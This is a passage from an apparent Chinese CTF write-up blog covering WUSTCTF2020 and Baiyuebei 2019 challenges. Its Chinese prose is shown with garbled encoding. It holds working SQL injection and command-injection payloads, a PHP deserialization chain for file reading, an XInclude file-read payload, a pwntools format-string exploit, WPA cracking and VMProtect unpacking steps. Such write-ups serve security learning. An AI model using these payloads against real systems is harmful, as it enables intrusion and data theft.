$age;unserialize($result);?&gt;</code></pre><p><code>flag{be7c6d56-1969-47d8-8eed-e672e5496d25}</code></p><h2 id="WUSTCTF2020-é¢œå€¼æˆç»©æŸ¥è¯¢"><a href="#WUSTCTF2020-é¢œå€¼æˆç»©æŸ¥è¯¢" class="headerlink" title="[WUSTCTF2020]é¢œå€¼æˆç»©æŸ¥è¯¢"></a>[WUSTCTF2020]é¢œå€¼æˆç»©æŸ¥è¯¢</h2><pre><code>0/**/uniunionon/**/select/**/1,2,3#0/**/uniunionon/**/select/**/1,group_concat(table_name),3/**/FROM/**/information_schema.tables/**/where/**/TABLE_SCHEMA=database()#flag,score0/**/uniunionon/**/select/**/1,GROUP_CONCAT(column_name),3/**/FROM/**/information_schema.columns/**/WHERE/**/table_name=&#39;flag&#39;#flag,value </code></pre><h2 id="WUSTCTF2020-æœ´å®æ— å"><a href="#WUSTCTF2020-æœ´å®æ— å" class="headerlink" title="[WUSTCTF2020]æœ´å®æ— å"></a>[WUSTCTF2020]æœ´å®æ— å</h2><p>åœ¨robots.txtä¸­å‘ç°fAke_f1agggg.php</p><p>åœ¨fAke_f1agggg.phpä¸­å‘ç°fl4g.php</p><pre><code class="php">&lt;img src=&quot;/img.jpg&quot;&gt;&lt;?phpheader(&#39;Content-type:text/html;charset=utf-8&#39;);error_reporting(0);highlight_file(__file__);//level 1if (isset($_GET[&#39;num&#39;])){    $num = $_GET[&#39;num&#39;];    if(intval($num) &lt; 2020 &amp;&amp; intval($num + 1) &gt; 2021){        echo &quot;æˆ‘ä¸ç»æ„é—´çœ‹äº†çœ‹æˆ‘çš„åŠ³åŠ›å£«, ä¸æ˜¯æƒ³çœ‹æ—¶é—´, åªæ˜¯æƒ³ä¸ç»æ„é—´, è®©ä½ çŸ¥é“æˆ‘è¿‡å¾—æ¯”ä½ å¥½.&lt;/br&gt;&quot;;    }else{        die(&quot;é‡‘é’±è§£å†³ä¸äº†ç©·äººçš„æœ¬è´¨é—®é¢˜&quot;);    }}else{    die(&quot;å»éæ´²å§&quot;);}//level 2if (isset($_GET[&#39;md5&#39;])){   $md5=$_GET[&#39;md5&#39;];   if ($md5==md5($md5))       echo &quot;æƒ³åˆ°è¿™ä¸ªCTFeræ‹¿åˆ°flagå, æ„Ÿæ¿€æ¶•é›¶, è·‘å»ä¸œæ¾œå²¸, æ‰¾ä¸€å®¶é¤å…, æŠŠå¨å¸ˆè½°å‡ºå», è‡ªå·±ç‚’ä¸¤ä¸ªæ‹¿æ‰‹å°èœ, å€’ä¸€æ¯æ•£è£…ç™½é…’, è‡´å¯Œæœ‰é“, åˆ«å­¦å°æš´.&lt;/br&gt;&quot;;   else       die(&quot;æˆ‘èµ¶ç´§å–Šæ¥æˆ‘çš„é…’è‚‰æœ‹å‹, ä»–æ‰“äº†ä¸ªç”µè¯, æŠŠä»–ä¸€å®¶å®‰æ’åˆ°äº†éæ´²&quot;);}else{    die(&quot;å»éæ´²å§&quot;);}//get flagif (isset($_GET[&#39;get_flag&#39;])){    $get_flag = $_GET[&#39;get_flag&#39;];    if(!strstr($get_flag,&quot; &quot;)){        $get_flag = str_ireplace(&quot;cat&quot;, &quot;wctf2020&quot;, $get_flag);        echo &quot;æƒ³åˆ°è¿™é‡Œ, æˆ‘å……å®è€Œæ¬£æ…°, æœ‰é’±äººçš„å¿«ä¹å¾€å¾€å°±æ˜¯è¿™ä¹ˆçš„æœ´å®æ— å, ä¸”æ¯ç‡¥.&lt;/br&gt;&quot;;        system($get_flag);    }else{        die(&quot;å¿«åˆ°éæ´²äº†&quot;);    }}else{    die(&quot;å»éæ´²å§&quot;);}?&gt;</code></pre><pre><code>/fl4g.php?num=1e10&amp;md5=0e215962017&amp;get_flag=a%3dc%26%26b%3da%26%26c%3dt%26%26$a$b$c%09*</code></pre><p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š <a href="http://blog.ccreater.top/2020/05/05/4æœˆåšé¢˜/">http://blog.ccreater.top/2020/05/05/4æœˆåšé¢˜/</a> <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>]]></content>
      
      
      <categories>
          
          <category> åšé¢˜ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç™¾è¶Šæ¯2019</title>
      <link href="/2020/04/20/byb2019/"/>
      <url>/2020/04/20/byb2019/</url>
      
        <content type="html"><![CDATA[<h1 id="byb"><a href="#byb" class="headerlink" title="byb"></a>byb</h1><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="ç­¾åˆ°"><a href="#ç­¾åˆ°" class="headerlink" title="ç­¾åˆ°"></a>ç­¾åˆ°</h3><p>cGxlYXNlIHN1Ym1pdDogZmxhZ3toZWxsb19ieWJ9</p><p>base64decode </p><p><code>please submit: flag{hello_byb}</code></p><h3 id="key"><a href="#key" class="headerlink" title="key"></a>key</h3><p>ä¸‹è½½é™„ä»¶,ç”¨photoshopæ”¾å¤§æŸ¥çœ‹,æœ‰ä¸€æ¡å¥‡å¥‡æ€ªæ€ªçš„é’¥åŒ™</p><p>ç”¨hxdæ‰“å¼€å›¾ç‰‡åœ¨å›¾ç‰‡æœ«å°¾æ‰¾åˆ°KEY:ISEEU!</p><p>æå–é’¥åŒ™ä¸­ç‰¹æ®Šé¢œè‰²çš„RGBå€¼ä¸keyå¾ªç¯å¼‚æˆ–</p><pre><code>2f3f24222e137f66247136457b7e2772331064672176670c7037237278167a60202133457b327774375c</code></pre><pre><code class="python">rgb=[&#39;2f&#39;,&#39;3f&#39;,&#39;24&#39;,&#39;22&#39;,&#39;2e&#39;,&#39;13&#39;,&#39;7f&#39;,&#39;66&#39;,&#39;24&#39;,&#39;71&#39;,&#39;36&#39;,&#39;45&#39;,&#39;7b&#39;,&#39;7e&#39;,&#39;27&#39;,&#39;72&#39;,&#39;33&#39;,&#39;10&#39;,&#39;64&#39;,&#39;67&#39;,&#39;21&#39;,&#39;76&#39;,&#39;67&#39;,&#39;0c&#39;,&#39;70&#39;,&#39;37&#39;,&#39;23&#39;,&#39;72&#39;,&#39;78&#39;,&#39;16&#39;,&#39;7a&#39;,&#39;60&#39;,&#39;20&#39;,&#39;21&#39;,&#39;33&#39; ,&#39;45&#39;,&#39;7b&#39;,&#39;32&#39;,&#39;77&#39;,&#39;74&#39;,&#39;37&#39;,&#39;5c&#39;]key=&quot;ISEEU!&quot;j=0for i in rgb:    print(chr(int(i,16)^ord(key[j])),end=&#39;&#39;)    j+=1    j%=6</code></pre><p>flag{265a4cd2-b7f1-4d32-9df7-733edfd2a21b}</p><h3 id="å“ˆå°”çš„ç§»åŠ¨åŸå ¡"><a href="#å“ˆå°”çš„ç§»åŠ¨åŸå ¡" class="headerlink" title="å“ˆå°”çš„ç§»åŠ¨åŸå ¡"></a>å“ˆå°”çš„ç§»åŠ¨åŸå ¡</h3><p>ä¸‹è½½é™„ä»¶å¾—åˆ°ori.jpgå’Œ102%</p><p>ç”¨hxdæ‰“å¼€åå‘ç°</p><p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8t8ovhhnlj306f05nwf0.jpg" alt="image.png"></p><p>è¿™æ˜¯ä¸€å¼ pngå›¾ç‰‡ä½†æ˜¯æ–‡ä»¶å¤´é”™äº†</p><p>åˆ’åˆ°æœ€åé¢å‘ç°PK</p><p>å›¾ç‰‡é‡Œé¢åˆè—åœ¨å‹ç¼©åŒ…,æœç´¢IENDæ‰¾åˆ°pngçš„æœ€åä¸€ä¸ªæ•°æ®å—(åˆ«é—®æˆ‘ä¸ºå•¥ä¸ç”¨foremost,è°ç”¨è°çŸ¥é“)</p><p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8t8uu1b1yj30jy025jry.jpg" alt="image.png"></p><p>åˆæ˜¯ä¸€ä¸ªé­”æ”¹çš„æ–‡ä»¶å¤´(æ­£å¸¸zipæ–‡ä»¶å¤´ 504B0304 ),æ‰‹åŠ¨åˆ†ç¦»å¾—åˆ°zip</p><p>emmmméœ€è¦å¯†ç </p><p>ç”¨stegsolveå‘ç°åˆ†ç¦»å‡ºæ¥çš„pngé‡Œè—ç€äºŒç»´ç </p><p>çŒœæµ‹åšäº†è’™ç‰ˆå¤„ç†</p><p>æ‰“å¼€psä¸€æ®µçŒ›å¦‚è™()(è‡ªé—­)çš„æ“ä½œå,æ‰‹åŠ¨æ‹¼æ¥å‡ºäº†äºŒç»´ç </p><p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8t8zumovfj309o0aa0t2.jpg" alt="image.png"></p><p>å¾—åˆ°å‹ç¼©åŒ…å¯†ç 1tsEz_b14ndVV4t3rM4k</p><p>è§£å‹å¾—åˆ°ä¸¤å¼ å›¾ç‰‡</p><p>ç”¨beyondcompareå¾—åˆ°flag</p><p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8t93pbylej30em0jjgqg.jpg" alt="image.png"></p><p>flag{3399dcb7-9e15-422f-9bf9-9db30dab70ae}</p><h3 id="wireless"><a href="#wireless" class="headerlink" title="wireless"></a>wireless</h3><p>ä¸‹è½½å¾—åˆ°readmeå’Œä¸€ä¸ªæµé‡</p><p>readme</p><pre><code>å·²çŸ¥å¯†ç æ ¼å¼æ˜¯6666xxxx</code></pre><p>åŸæœ¬è¯•ç€ç”Ÿæˆä¸€ä¸ªæ‰€æœ‰å¯æ‰“å°å­—ç¬¦çš„å¯†ç ,ä½†æ˜¯è¿™ä¸ªä¹Ÿè¦500m+</p><p>æ‰€ä»¥å…ˆç”¨çº¯æ•°å­—å¯†ç è¯•è¯•</p><pre><code class="python">f=open(&quot;dict.txt&quot;,&quot;w&quot;)for i in range(10**4):    f.write(&quot;6666%04d\n&quot;%i)f.close()</code></pre><p>ç”¨kaliçš„<code>aircrack-ng</code> æ¥ç ´è§£é€šä¿¡å†…å®¹</p><p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8t9ym6aq4j30ka0djwoh.jpg" alt="image.png"></p><p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8t9zwgppwj30kf0e3aj3.jpg" alt="image.png"></p><p>flag{0566668912-f059-448f}</p><p>å¹¸äºæ²¡æœ‰ç›´æ¥çˆ†æ‰€æœ‰å¯æ‰“å°å­—ç¬¦</p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="babyphp"><a href="#babyphp" class="headerlink" title="babyphp"></a>babyphp</h3><pre><code class="php">&lt;?phperror_reporting(1);class Read {    private $var;    public function file_get($value)    {        $text = base64_encode(file_get_contents($value));        return $text;    }    public function __invoke(){        $content = $this-&gt;file_get($this-&gt;var);        echo $content;    }}class Show{    public $source;    public $str;    public function __construct($file=&#39;index.php&#39;)    {        $this-&gt;source = $file;        echo $this-&gt;source.&#39;ç‘™ï½†ç€½å¯®â‚¬æ¿®ï¿½&#39;.&quot;&lt;br&gt;&quot;;    }    public function __toString()    {        $this-&gt;str[&#39;str&#39;]-&gt;source;    }    public function _show()    {        if(preg_match(&#39;/http|https|file:|gopher|dict|\.\.|fllllllaaaaaag/i&#39;,$this-&gt;source)) {            die(&#39;hacker!&#39;);        } else {            highlight_file($this-&gt;source);        }    }    public function __wakeup()    {        print(&quot;step1&quot;);        if(preg_match(&quot;/http|https|file:|gopher|dict|\.\./i&quot;, $this-&gt;source)) {            echo &quot;hacker~&quot;;            $this-&gt;source = &quot;index.php&quot;;        }    }}class Test{    public $params;    public function __construct()    {        $this-&gt;params = array();    }    public function __get($key)    {        $func = $this-&gt;params;        return $func();    }  }if(isset($_GET[&#39;chal&#39;])){    $chal = unserialize($_GET[&#39;chal&#39;]);}else{    $show = new Show(&#39;index.php&#39;);    $show-&gt;_show();}?&gt;</code></pre><p>%100ååºåˆ—åŒ–é“¾æ„é€ </p><ol><li><p><code>Show::__wake</code>æ˜¯å”¯ä¸€å¯ä»¥å…¥æ‰‹çš„åœ°æ–¹</p></li><li><p>åœ¨è¿™ä¸ªæ–¹æ³•ä¸­åªæœ‰$this-&gt;sourceå¯ä»¥æ„é€ popé“¾çš„è¿æ¥ç‚¹</p></li></ol><p>é˜…è¯»ä»£ç å‘ç°<code>Show::__toString</code>ä¼šè¢«<code>if(preg_match(&quot;/http|https|file:|gopher|dict|\.\./i&quot;, $this-&gt;source))</code>è°ƒç”¨</p><ol start="3"><li><code>Show::__toString</code>:  $this-&gt;str[â€˜strâ€™]-&gt;sourceå’Œ<code>Test::__get</code>æ„æˆé“¾æ¥ç‚¹</li><li><code>Test::__get</code>: <code>$func = $this-&gt;params;return $func();</code>å’Œ<code>Read::__invoke</code>æ„æˆé“¾æ¥ç‚¹</li><li>è€ŒRead()å¯ä»¥ä»»æ„è¯»å–æ–‡ä»¶</li></ol><p>payloadç”Ÿæˆ:</p><pre><code class="php">&lt;?phpclass Show{    public $source;    public $str;    public function __construct($file=&quot;&quot;)    {    }    public function _show()    {        if(preg_match(&#39;/http|https|file:|gopher|dict|\.\.|fllllllaaaaaag/i&#39;,$this-&gt;source)) {            die(&#39;hacker!&#39;);        } else {            highlight_file($this-&gt;source);        }    }    public function __wakeup()    {    }}class Read {    private $var=&quot;fllllllaaaaaag.php&quot;;    public function file_get($value)    {        $text = base64_encode(file_get_contents($value));        return $text;    }    public function __invoke(){        $content = $this-&gt;file_get($this-&gt;var);        echo $content;    }}class Test{    public $params;    private $source=&quot;666&quot;;    public function __construct()    {    }    public function __get($key)    {        $func = $this-&gt;params;        return $func();    }  }$a=new Show();$b=new Show();$c=new Test;//$s-&gt;str[&quot;str&quot;] = $t;//Read::__invoke$c-&gt;params=new Read;//Test::__get$b-&gt;str[&#39;str&#39;]=$c;//Show::__tostring$a-&gt;source=$b;print(urlencode(serialize($a)));?&gt;</code></pre><p>æœ€åä¸€æ­¥å°±å‰©flagçš„æ–‡ä»¶å,ä»æ­£åˆ™ä¸­æŠ å‡º<code>fllllllaaaaaag</code>ä½†æ˜¯ç›´æ¥è¯»å–,ç½‘é¡µ500,æ˜¯æ–‡ä»¶ä¸å­˜åœ¨çš„ç»“æœ</p><p>ä¸€ç•ªå°è¯•åflagçš„æ–‡ä»¶å<code>fllllllaaaaaag.php</code></p><pre><code>&lt;?php$flag = &quot;flag{df210681-fb10-4c0f-ba25-1f678eb38f85}&quot;;?&gt;</code></pre><h3 id="babygame"><a href="#babygame" class="headerlink" title="babygame"></a>babygame</h3><p>æ–‡ä»¶æ ‘</p><pre><code>index.htmltools.php?hash=manage.php?showuer            register            login            msgid=1</code></pre><p>index.html</p><p><code>&lt;!-- if you need hash tools, location: tools.php --&gt;</code></p><p>flagç”Ÿæˆæ–¹å¼</p><p><code>flag{md5(name . md5(pass))}</code></p><p>ç½‘ç«™å­˜åœ¨ä¸¤ä¸ªcookie: __jsluid_h , PHPSESSID </p><p>çº¦æŸæ”»å‡»ç”Ÿæ•ˆ,ä½†æ˜¯æ— æ³•æ‹¿åˆ°flag</p><p>äºŒæ¬¡æ³¨å…¥æµ‹è¯•é€ƒé€¸å¼•å·</p><p>å®½å­—èŠ‚x=&gt;æ­£å¸¸å›æ˜¾</p><p>%00x=&gt;\0</p><p>å‡ºç°éœ€è¦è½¬ä¹‰çš„åœ°æ–¹æ²¡æœ‰å‡flag</p><p><code>a&#39;#</code>æ²¡æœ‰flag</p><p><code>a\&#39;#</code>å‡ºç°flag,md5ä¸º<code>flag{md5(&quot;a\\\&#39;&quot; . md5(pass))}</code></p><p>è€Œç›´æ¥<code>b\&#39;#</code>æ˜¯æ²¡æœ‰flagçš„,è€Œä¸”ä¸#æ— å…³</p><p>åˆ¤æ–­ç”¨æˆ·æ—¶å€™å­˜åœ¨å†ç»™ä¸€ä¸ªflagé“¾æ¥</p><pre><code>a\\\&#39;#=&gt;a\&#39;#=&gt;select * from xx where user=&#39;$user&#39;?a\&#39;=&gt;a&#39;,ç”¨æˆ·ä¸å­˜åœ¨çŒœæµ‹</code></pre><p><code>c\&#39;#</code>=&gt;no flag</p><p><code>c&#39;#</code>=&gt;<code>c\&#39;#</code>å‡ºç°flag(å¾—åˆ é™¤cookie)</p><p>æ³¨å…¥ç‚¹å°±åœ¨è¿™</p><p>ä»€ä¹ˆä»£ç å¯¼è‡´è¿™ç§ç»“æœ</p><p>ç™»é™†æ—¶:<code>$_SESSION[x]=query(&quot;select * from xx where user=&#39;&quot;.mysql_real_escape($_POST[&#39;user&#39;]).&quot;&#39; and pass=&#39;&quot;.mysql_real_escape($_POST[&#39;pass&#39;])&quot;).&quot;&#39;&quot;</code></p><p><code>query(&quot;select * from xx where user=&#39;$_SESSION[x]&#39;&quot;)</code></p><pre><code>user    php($_SESSION) mysql(&#39;$sql&#39;)a&#39;        a&#39;             a&#39;a\&#39;        a\&#39;         a\&#39;</code></pre><p>å­˜åœ¨è¿‡æ»¤?</p><p>ä¾æ®ä¸ªæ•°ç”Ÿæˆflagé“¾æ¥</p><p>åé¢æƒ³åˆ°ä¸ºå•¥æ³¨å…¥ç‚¹ä¸å¯ä»¥æ˜¯msgidå‘¢</p><p>çº¦æŸæ”»å‡»è·å¾—ä¸€ä¸ªåªå¸¦æœ‰<code>\</code>çš„è´¦å·</p><p>æ³¨å†Œä¸€ä¸ªa+â€™ â€˜*28+â€™â€â€˜ çš„è´¦å·</p><p>msgidå¤„å‡ºç°æ³¨å…¥ç‚¹</p><p><code>or 1%23</code>æˆåŠŸ</p><p>ç”¨sqlmapçˆ†ç ´å¾—åˆ°adminçš„å¯†ç æ‹¿åˆ°tools.phpè§£å¯†å¾—åˆ°:<code>ChunQiuGame</code></p><p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8ta75axdlj30bv036jrd.jpg" alt="image.png"></p><p>æ­£å¸¸çš„xxeæ²¡å•¥ç”¨,æ‰¾åˆ°ä¸€å¶é£˜é›¶çš„ä¸€ç¯‡æ–‡ç« </p><p><a href="https://www.anquanke.com/post/id/156227" target="_blank" rel="noopener">https://www.anquanke.com/post/id/156227</a></p><p>payload:</p><pre><code>&lt;root xmlns:xi=&quot;http://www.w3.org/2001/XInclude&quot;&gt; &lt;xi:include href=&quot;file:///flag&quot; parse=&quot;text&quot;/&gt;&lt;/root&gt;</code></pre><p>flag{5ea7d712-e461-4d29-9246-4ea6266775a8}</p><p>â€¦â€¦â€¦â€¦â€¦â€¦..æ°”æ­»äº†å°±å·®ä¸€ç‚¹æ‹¿åˆ°flag</p><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="easy-printf"><a href="#easy-printf" class="headerlink" title="easy_printf"></a>easy_printf</h3><p>pwnable.twåŸé¢˜é­”æ”¹ï¼Œ<code>bss</code>æ²¡æœ‰<code>stdin</code>,<code>stdout</code>,<code>stderr</code>äº†ï¼Œä½†æ˜¯ä¸€å¼€å§‹æœ‰ä¸ªè¯¢é—®å§“åï¼Œä¸çŸ¥é“æœ‰ä»€ä¹ˆç”¨,åæ¥è¯•äº†å„ç§æ–¹æ³•ï¼Œæƒ³åˆ°äº†æŠŠ<code>stdout</code>çš„<code>fileno</code>æ”¹ä¸º<code>2</code>ï¼Œå°±å¯ä»¥ç»•è¿‡<code>close(1)</code>äº†<br>è€Œä¸”åˆšå¥½</p><pre><code class="asm"> â–º 0x40089f &lt;func1+57&gt;    mov    eax, 0   0x4008a4 &lt;func1+62&gt;    call   func2 &lt;0x4007fa&gt;   0x4008a9 &lt;func1+67&gt;    mov    eax, 0   0x4008ae &lt;func1+72&gt;    mov    rcx, qword ptr [rbp - 8]   0x4008b2 &lt;func1+76&gt;    xor    rcx, qword ptr fs:[0x28]   0x4008bb &lt;func1+85&gt;    je     func1+92 &lt;0x4008c2&gt;   0x4008bd &lt;func1+87&gt;    call   0x400648   0x4008c2 &lt;func1+92&gt;    leave     0x4008c3 &lt;func1+93&gt;    ret       0x4008c4 &lt;main&gt;        push   rbp   0x4008c5 &lt;main+1&gt;      mov    rbp, rspâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ STACK ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€00:0000â”‚ rsi rsp  0x7fffc9a192f0 â—‚â€” 0x4141414141414141 (&#39;AAAAAAAA&#39;)01:0008â”‚          0x7fffc9a192f8 â€”â–¸ 0x7fe173507690 (_IO_file_underflow+496) â—‚â€” 0xe8df8948fffffeff02:0010â”‚          0x7fffc9a19300 â€”â–¸ 0x7fe173852540 (_IO_2_1_stderr_) â—‚â€” 0xfbad2087</code></pre><p>åå­—ä¸‹é¢æ®‹ç•™æœ‰<code>stderr</code>ï¼Œæ‰€ä»¥è¯»å–åå­—æ—¶,<code>partial overwrite</code>æ”¹ä¸º<code>_IO_2_1_stdout_-&gt;_fileno</code>ï¼Œç„¶åæŠŠ<code>_fileno</code>æ”¹ä¸º2å³å¯ï¼Œåé¢çš„å’Œ<code>pwnable.tw</code>æ²¡ä»€ä¹ˆåŒºåˆ«ï¼Œæœ‰äº†æ³„éœ²ï¼Œä¹Ÿæœ‰äº†æ— é™æ ¼å¼åŒ–å­—ç¬¦ä¸²æ”»å‡»ï¼Œéšä¾¿æ€ä¹ˆç©</p><p>expä¸º:</p><pre><code class="python">from pwn import *def fmtstr(offset, addr, data, written):    cnt = 0    payload = &#39;&#39;    address = &#39;&#39;    for x in data:        cur = ord(x)        if cur &gt;= written&amp;0xff:            to_add = cur - (written&amp;0xff)        else:            to_add = 0x100 + cur - (written&amp;0xff)        round = &#39;&#39;        if to_add != 0:            round += &quot;%{}c&quot;.format(to_add)        round += &quot;%{}$hhn&quot;.format(offset+cnt+len(data)*2)        assert(len(round) &lt;= 0x10)        written += to_add + 0x10 - len(round)        payload += round.ljust(0x10, &#39;_&#39;)        address += p64(addr+cnt)        cnt+=1    return payload + addressdef main(host,port=12001):    if host:        p = remote(host,port)    else:        # p = process(&quot;./easy_printf&quot;,env={&quot;LD_PRELOAD&quot;:&quot;./libc.so&quot;})        p = process(&quot;./easy_printf&quot;)        gdb.attach(p,&quot;b *0x000000000400846&quot;)    p.recvuntil(&quot;write down your name&quot;)    # t = raw_input(&#39;guess: &#39;)    t = 0x7    stdout_fileno = (int(t) &lt;&lt; 12) | 0x690    p.send(&quot;A&quot;*0x10+p16(stdout_fileno))    pause()    buf_addr = 0x601060    payload =  &quot;%{}c%28$hhn%{}c%58$hn&quot;.format(2,0x2a6).ljust(0x18,&#39;_&#39;)    payload += fmtstr(9,buf_addr,p64(0x000000000400814)[:3],0x2ab)    p.send(payload)    pause()    payload =  &quot;%{}c%23$hhn%35$p-%36$p^%37$p-%38$p-%39$p*%40$p-&quot;.format(0x14)    p.send(payload)    pause()    p.recvuntil(&quot;^&quot;)    stack = int(p.recvuntil(&#39;-&#39;,drop=True),16)    p.recvuntil(&quot;*&quot;)    libc.address = int(p.recvuntil(&#39;-&#39;,drop=True),16)-0x20837    info(&quot;stack : &quot; + hex(stack))    info(&quot;libc : &quot; + hex(libc.address))    onegadget = 0xf1147+libc.address    ret_addr = stack - 0x1e8    payload =  &quot;%{}c%23$hhn&quot;.format(0x14).ljust(0x10,&#39;_&#39;)    payload += fmtstr(15,ret_addr,p64(onegadget)[:2],0x19)    p.send(payload)    pause()    # :0000000000400865                 retn    offset = 13    payload =  &quot;%{}c%16$hhn%{}c%17$hn&quot;.format(ord(p64(onegadget)[2:3]),0x865-ord(p64(onegadget)[2:3])).ljust(0x18,&#39;_&#39;)    payload += p64(ret_addr+2)+p64(ret_addr-8)    payload = payload.ljust(0x80,&quot;\x00&quot;)    p.send(payload)    p.interactive()if __name__ == &quot;__main__&quot;:    libc = ELF(&quot;./libc.so&quot;,checksec=False)    main(args[&#39;REMOTE&#39;])</code></pre><h2 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h2><h3 id="bwarm"><a href="#bwarm" class="headerlink" title="bwarm"></a>bwarm</h3><p>é¦–å…ˆï¼Œè¿˜æ˜¯æŸ¥å£³ï¼Œæ²¡å•¥è¯´çš„ vmp2.0.7</p><p> æ ¹æ®vmpç³»åˆ—è„±å£³æ•™ç¨‹ï¼Œè¿™ä¸ªå£³æ˜¯1.8ä»¥ä¸Šçš„æ–¹æ¡ˆè¿›è¡Œè„±å£³ã€‚å…ˆæ‹–å…¥ODï¼Œä¸‹ä¸€ä¸ªAPIæ–­ç‚¹  VirtualProtect (æ•™ç¨‹å»ºè®®æ˜¯ä¸‹ç¡¬ä»¶æ–­ç‚¹ï¼Œå¯èƒ½æ˜¯æˆ‘çš„ODæœ‰é—®é¢˜ï¼Œç¡¬ä»¶æ–­ç‚¹æ–­ä¸ä¸‹æ¥ï¼Œåªèƒ½æ˜¯F2æ–­ç‚¹äº† T_T)</p><p>ç„¶åF9å¼€å§‹è·‘ï¼Œæµ‹è¯•åˆ°ç¬¬5æ¬¡è·‘é£â€¦â€¦</p><p>é‚£ä¹ˆå°±åœ¨ç¬¬å››æ¬¡çš„æ—¶å¼€å§‹å€™å•æ­¥è·Ÿè¸ªï¼Œå…ˆè·³å‡ºVirtualProtect å‡½æ•° ï¼Œç„¶åå¯¹ä»£ç æ®µè®¾ç½®ï¼Œå†…å­˜è®¿é—®æ–­ç‚¹</p><p>ç„¶åF9ç»§ç»­è¿è¡Œï¼Œæ–­ä¸‹æ¥åï¼Œåœ¨ESPçš„åœ°æ–¹è·Ÿè¸ªå†…å­˜æ•°æ®ï¼Œæ‰¾åˆ°SEHç»“æ„åŒ–å¼‚å¸¸çš„ä¸Šé¢35Cåœ°å€é‚£å—ï¼Œä¸‹ä¸€ä¸ªç¡¬ä»¶å†™å…¥æ–­ç‚¹ï¼Œå¹¶å–æ¶ˆä¹‹å‰çš„å†…å­˜è®¿é—®æ–­ç‚¹</p><p>ç„¶åç»§ç»­F9è¿è¡Œï¼Œå†æ¬¡æ–­ä¸‹æ¥ï¼Œè¿™æ¬¡å†åœ¨ä»£ç æ–­ä¸‹å†…å­˜è®¿é—®æ–­ç‚¹ï¼Œç„¶åå¤šæ¬¡F9è¿è¡Œï¼Œæ³¨æ„è§‚å¯Ÿæ ˆå¸§çš„å˜åŒ–ï¼Œå¿«åˆ°SEHçš„åœ°æ–¹å°±æ¥è¿‘OEPäº†ï¼Œæ­¤æ—¶å·²ç»è·Ÿè¸ªåˆ°è§£å‹åçš„ä»£ç æ®µï¼Œç„¶åè¿›è¡Œä¸€ä¸‹ä»£ç åˆ†æã€‚</p><p>å®Œæˆåˆ†æåï¼Œä»£ç å°±è¿˜åŸäº†ï¼Œç„¶åå•æ­¥è·Ÿè¸ªï¼Œå‘ç°OEP </p><p>å‘ç°OEPåï¼ŒåŒæ—¶æˆ‘ä»¬ä¹Ÿæ³¨æ„åˆ°æ ˆå¸§éƒ¨åˆ†è¢«å‹å…¥äº†3æ¡æ•°æ®ï¼Œè¿™ä¸ªå°±æ˜¯VMPå·å–çš„ä»£ç ï¼Œæˆ‘ä»¬éœ€è¦è¿›è¡Œè¿˜åŸï¼Œäºæ˜¯åœ¨å½“å‰ä½ç½®æŸ¥æ‰¾ä¸€æ®µ 0000000000çš„å†…å­˜æ®µ</p><p>ç„¶åï¼Œå¯¹VMPå·å–çš„ä»£ç è¿›è¡Œpatchã€‚æœ€åè·³è½¬åˆ°OEP ä¹Ÿå°±æ˜¯ jmp 012319C9</p><p>æ¥ç€æˆ‘ä»¬æŠŠå½“å‰çš„ 01231FB5 è®¾ç½®ä¸ºæ–°çš„EIPï¼Œå°±å¯ä»¥è¿›è¡Œdumpå†…å­˜æ“ä½œäº†ï¼Œå¡«å¥½èµ·å§‹åœ°å€å’Œå…¥å£åœ°å€åï¼Œç‚¹å‡»è„±å£³</p><p>æŠŠè„±å£³çš„æ–‡ä»¶ä¿å­˜ä¸º dump.exe ç„¶åå°è¯•è¿è¡Œï¼Œå‘ç°ä¸èƒ½è¿è¡Œï¼Œç›´æ¥å´©æºƒæ‰äº†</p><p>äºæ˜¯çŒœåˆ°å¯èƒ½æ˜¯é‡å®šå‘è¡¨çš„é—®é¢˜é€ æˆï¼Œç”¨PEç¼–è¾‘å™¨ä¿®æ”¹ä¸€ä¸‹è¿™é‡Œï¼Œç„¶åä¿å­˜ã€‚</p><p>å†æ¬¡è¿è¡Œï¼ŒOK 